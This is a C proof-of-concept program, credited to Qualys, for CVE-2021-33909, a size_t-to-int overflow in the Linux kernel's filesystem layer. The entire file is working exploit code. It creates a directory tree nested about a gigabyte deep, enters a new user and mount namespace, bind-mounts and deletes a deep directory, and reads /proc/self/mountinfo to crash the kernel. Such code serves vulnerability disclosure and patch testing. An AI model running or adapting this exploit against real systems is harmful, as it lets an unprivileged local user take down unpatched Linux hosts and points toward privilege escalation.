/*
 * CVE-2021-33909: size_t-to-int vulnerability in Linux's filesystem layer
 * Copyright (C) 2021 Qualys, Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <sched.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <unistd.h>

#define PAGE_SIZE (4096)

#define die() do { \
    fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \
    exit(EXIT_FAILURE); \
} while (0)

static void
send_recv_state(const int sock, const char * const sstate, const char rstate)
{
    if (sstate) {
        if (send(sock, sstate, 1, MSG_NOSIGNAL) != 1) die();
    }
    if (rstate) {
        char state = 0;
        if (read(sock, &state, 1) != 1) die();
        if (state != rstate) die();
    }
}

static const char * bigdir;
static char onedir[NAME_MAX + 1];

typedef struct {
    pid_t pid;
    int socks[2];
    size_t count;
    int delete;
} t_userns;

static int
userns_fn(void * const arg)
{
    if (!arg) die();
    const t_userns * const userns = arg;
    const int sock = userns->socks[1];
    if (close(userns->socks[0])) die();

    send_recv_state(sock, NULL, 'A');

    size_t n;
    if (chdir(bigdir)) die();
    for (n = 0; n <= userns->count / (1 + (sizeof(onedir)-1) * 4); n++) {
        if (chdir(onedir)) die();
    }
    char device[] = "./device.XXXXXX";
    if (!mkdtemp(device)) die();
    char mpoint[] = "/tmp/mpoint.XXXXXX";
    if (!mkdtemp(mpoint)) die();
    if (mount(device, mpoint, NULL, MS_BIND, NULL)) die();

    if (userns->delete) {
        if (rmdir(device)) die();
    }
    if (chdir("/")) die();

    send_recv_state(sock, "B", 'C');

    const int fd = open("/proc/self/mountinfo", O_RDONLY);
    if (fd <= -1) die();
    static char buf[1UL << 20];
    size_t len = 0;
    for (;;) {
        ssize_t nbr = read(fd, buf, 1024);
        if (nbr <= 0) die();
        for (;;) {
            const char * nl = memchr(buf, '\n', nbr);
            if (!nl) break;
            nl++;
            if (memmem(buf, nl - buf, "\\134", 4)) die();
            nbr -= nl - buf;
            memmove(buf, nl, nbr);
            len = 0;
        }
        len += nbr;
        if (memmem(buf, nbr, "\\134", 4)) break;
    }

    send_recv_state(sock, "D", 'E');
    die();
}

static void
update_id_map(char * const mapping, const char * const map_file)
{
    const size_t map_len = strlen(mapping);
    if (map_len >= SSIZE_MAX) die();
    if (map_len <= 0) die();

    size_t i;
    for (i = 0; i < map_len; i++) {
        if (mapping[i] == ',')
            mapping[i] = '\n';
    }

    const int fd = open(map_file, O_WRONLY);
    if (fd <= -1) die();
    if (write(fd, mapping, map_len) != (ssize_t)map_len) die();
    if (close(fd)) die();
}

static void
proc_setgroups_write(const pid_t child_pid, const char * const str)
{
    const size_t str_len = strlen(str);
    if (str_len >= SSIZE_MAX) die();
    if (str_len <= 0) die();

    char setgroups_path[64];
    snprintf(setgroups_path, sizeof(setgroups_path), "/proc/%ld/setgroups", (long)child_pid);

    const int fd = open(setgroups_path, O_WRONLY);
    if (fd <= -1) {
        if (fd != -1) die();
        if (errno != ENOENT) die();
        return;
    }
    if (write(fd, str, str_len) != (ssize_t)str_len) die();
    if (close(fd)) die();
}

static void
fork_userns(t_userns * const userns, const size_t size, const int delete)
{
    static const size_t stack_size = (1UL << 20) + 2 * PAGE_SIZE;
    static char * stack = NULL;
    if (!stack) {
        stack = mmap(NULL, stack_size, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
        if (!stack || stack == MAP_FAILED) die();
        if (mprotect(stack + PAGE_SIZE, stack_size - 2 * PAGE_SIZE, PROT_READ | PROT_WRITE)) die();
    }

    if (!userns) die();
    userns->count = size / 2;
    userns->delete = delete;

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, userns->socks)) die();
    userns->pid = clone(userns_fn, stack + stack_size - PAGE_SIZE, CLONE_NEWUSER | CLONE_NEWNS | SIGCHLD, userns);
    if (userns->pid <= -1) die();
    if (close(userns->socks[1])) die();
    userns->socks[1] = -1;

    char map_path[64], map_buf[64];
    snprintf(map_path, sizeof(map_path), "/proc/%ld/uid_map", (long)userns->pid);
    snprintf(map_buf, sizeof(map_buf), "0 %ld 1", (long)getuid());
    update_id_map(map_buf, map_path);

    proc_setgroups_write(userns->pid, "deny");
    snprintf(map_path, sizeof(map_path), "/proc/%ld/gid_map", (long)userns->pid);
    snprintf(map_buf, sizeof(map_buf), "0 %ld 1", (long)getgid());
    update_id_map(map_buf, map_path);

    send_recv_state(*userns->socks, "A", 'B');
}

static void
wait_userns(t_userns * const userns)
{
    if (!userns) die();
    if (kill(userns->pid, SIGKILL)) die();

    int status = 0;
    if (waitpid(userns->pid, &status, 0) != userns->pid) die();
    userns->pid = -1;
    if (!WIFSIGNALED(status)) die();
    if (WTERMSIG(status) != SIGKILL) die();

    if (close(*userns->socks)) die();
    *userns->socks = -1;
}

int
main(const int argc, const char * const argv[])
{
    if (argc != 2) die();
    bigdir = argv[1];
    if (*bigdir != '/') die();

    if (sizeof(onedir) != 256) die();
    memset(onedir, '\\', sizeof(onedir)-1);
    if (onedir[sizeof(onedir)-1] != '\0') die();

    puts("creating directories, please wait...");
    if (mkdir(bigdir, S_IRWXU) && errno != EEXIST) die();
    if (chdir(bigdir)) die();
    size_t i;
    for (i = 0; i <= (1UL << 30) / (1 + (sizeof(onedir)-1) * 4); i++) {
        if (mkdir(onedir, S_IRWXU) && errno != EEXIST) die();
        if (chdir(onedir)) die();
    }
    if (chdir("/")) die();

    static t_userns userns;
    fork_userns(&userns, (1UL << 31), 1);
    puts("crashing...");
    send_recv_state(*userns.socks, "C", 'D');
    wait_userns(&userns);
    die();
}
